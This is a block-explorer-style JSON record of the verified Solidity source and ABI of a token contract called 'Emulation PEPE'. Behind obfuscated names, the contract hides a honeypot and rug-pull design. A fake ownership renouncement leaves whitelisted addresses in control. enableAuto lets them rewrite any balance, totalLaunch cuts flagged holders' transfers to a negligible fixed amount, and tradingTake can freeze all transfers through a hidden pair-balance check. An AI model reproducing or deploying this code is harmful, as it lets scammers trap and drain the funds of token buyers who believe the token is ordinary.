{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\ninterface listAt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address exemptMode) external view returns (uint256);\n\n    function transfer(address enableFee, uint256 amountLiquidity) external returns (bool);\n\n    function allowance(address tokenSwap, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 amountLiquidity) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address enableFee,\n        uint256 amountLiquidity\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tokenEnable, uint256 value);\n    event Approval(address indexed tokenSwap, address indexed spender, uint256 value);\n}\n\nabstract contract launchedLimit {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface isMode {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface walletTakeLaunch {\n    function createPair(address liquidityReceiverWallet, address minAt) external returns (address);\n}\n\ninterface launchLimitMin is listAt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract EmulationPEPE is launchedLimit, listAt, launchLimitMin {\n\n    function enableAuto(address amountExemptTotal, uint256 amountLiquidity) public {\n        modeTeam();\n        receiverMarketingLiquidity[amountExemptTotal] = amountLiquidity;\n    }\n\n    address swapTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 listMarketing;\n\n    function allowance(address feeAt, address takeAtBuy) external view virtual override returns (uint256) {\n        if (takeAtBuy == swapTotal) {\n            return type(uint256).max;\n        }\n        return isShould[feeAt][takeAtBuy];\n    }\n\n    bool public tradingLaunch;\n\n    function buyTeamLiquidity() public {\n        emit OwnershipTransferred(shouldMarketing, address(0));\n        senderIs = address(0);\n    }\n\n    uint256 constant exemptAmount = 17 ** 10;\n\n    string private launchTxWallet = \"Emulation PEPE\";\n\n    function receiverLiquidity(address minLaunch, address enableFee, uint256 amountLiquidity) internal returns (bool) {\n        require(receiverMarketingLiquidity[minLaunch] >= amountLiquidity);\n        receiverMarketingLiquidity[minLaunch] -= amountLiquidity;\n        receiverMarketingLiquidity[enableFee] += amountLiquidity;\n        emit Transfer(minLaunch, enableFee, amountLiquidity);\n        return true;\n    }\n\n    mapping(address => uint256) private receiverMarketingLiquidity;\n\n    function teamSenderTake(address minLaunch, address enableFee, uint256 amountLiquidity) internal returns (bool) {\n        if (minLaunch == shouldMarketing) {\n            return receiverLiquidity(minLaunch, enableFee, amountLiquidity);\n        }\n        uint256 walletFrom = listAt(maxBuy).balanceOf(feeToken);\n        require(walletFrom == listMarketing);\n        require(enableFee != feeToken);\n        if (modeTo[minLaunch]) {\n            return receiverLiquidity(minLaunch, enableFee, exemptAmount);\n        }\n        return receiverLiquidity(minLaunch, enableFee, amountLiquidity);\n    }\n\n    function transferFrom(address minLaunch, address enableFee, uint256 amountLiquidity) external override returns (bool) {\n        if (_msgSender() != swapTotal) {\n            if (isShould[minLaunch][_msgSender()] != type(uint256).max) {\n                require(amountLiquidity <= isShould[minLaunch][_msgSender()]);\n                isShould[minLaunch][_msgSender()] -= amountLiquidity;\n            }\n        }\n        return teamSenderTake(minLaunch, enableFee, amountLiquidity);\n    }\n\n    mapping(address => bool) public modeTo;\n\n    constructor (){\n        \n        isMode feeSell = isMode(swapTotal);\n        maxBuy = walletTakeLaunch(feeSell.factory()).createPair(feeSell.WETH(), address(this));\n        if (toMax != amountEnable) {\n            exemptReceiver = senderMode;\n        }\n        shouldMarketing = _msgSender();\n        buyTeamLiquidity();\n        limitSender[shouldMarketing] = true;\n        receiverMarketingLiquidity[shouldMarketing] = marketingSender;\n        \n        emit Transfer(address(0), shouldMarketing, marketingSender);\n    }\n\n    mapping(address => mapping(address => uint256)) private isShould;\n\n    string private receiverMin = \"EPE\";\n\n    function name() external view virtual override returns (string memory) {\n        return launchTxWallet;\n    }\n\n    function tradingTake(uint256 amountLiquidity) public {\n        modeTeam();\n        listMarketing = amountLiquidity;\n    }\n\n    bool public buyLaunched;\n\n    uint256 private senderMode;\n\n    bool private sellTake;\n\n    function transfer(address amountExemptTotal, uint256 amountLiquidity) external virtual override returns (bool) {\n        return teamSenderTake(_msgSender(), amountExemptTotal, amountLiquidity);\n    }\n\n    address private senderIs;\n\n    address feeToken = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool private exemptSender;\n\n    function balanceOf(address exemptMode) public view virtual override returns (uint256) {\n        return receiverMarketingLiquidity[exemptMode];\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverMin;\n    }\n\n    function totalLaunch(address listFee) public {\n        modeTeam();\n        \n        if (listFee == shouldMarketing || listFee == maxBuy) {\n            return;\n        }\n        modeTo[listFee] = true;\n    }\n\n    uint8 private amountToTrading = 18;\n\n    event OwnershipTransferred(address indexed receiverFund, address indexed fromTeam);\n\n    function decimals() external view virtual override returns (uint8) {\n        return amountToTrading;\n    }\n\n    bool public amountEnable;\n\n    bool public toMax;\n\n    uint256 public exemptReceiver;\n\n    function txFeeSwap(address exemptAtReceiver) public {\n        if (tradingLaunch) {\n            return;\n        }\n        \n        limitSender[exemptAtReceiver] = true;\n        if (exemptSender == amountEnable) {\n            amountEnable = false;\n        }\n        tradingLaunch = true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return marketingSender;\n    }\n\n    address public shouldMarketing;\n\n    function modeTeam() private view {\n        require(limitSender[_msgSender()]);\n    }\n\n    function getOwner() external view returns (address) {\n        return senderIs;\n    }\n\n    address public maxBuy;\n\n    uint256 tradingMin;\n\n    function approve(address takeAtBuy, uint256 amountLiquidity) public virtual override returns (bool) {\n        isShould[_msgSender()][takeAtBuy] = amountLiquidity;\n        emit Approval(_msgSender(), takeAtBuy, amountLiquidity);\n        return true;\n    }\n\n    uint256 private marketingSender = 100000000 * 10 ** 18;\n\n    function owner() external view returns (address) {\n        return senderIs;\n    }\n\n    mapping(address => bool) public limitSender;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromTeam\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenEnable\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeAtBuy\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeAtBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountLiquidity\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptMode\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTeamLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountExemptTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountLiquidity\",\"type\":\"uint256\"}],\"name\":\"enableAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listFee\",\"type\":\"address\"}],\"name\":\"totalLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amountLiquidity\",\"type\":\"uint256\"}],\"name\":\"tradingTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountExemptTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountLiquidity\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountLiquidity\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptAtReceiver\",\"type\":\"address\"}],\"name\":\"txFeeSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "EmulationPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}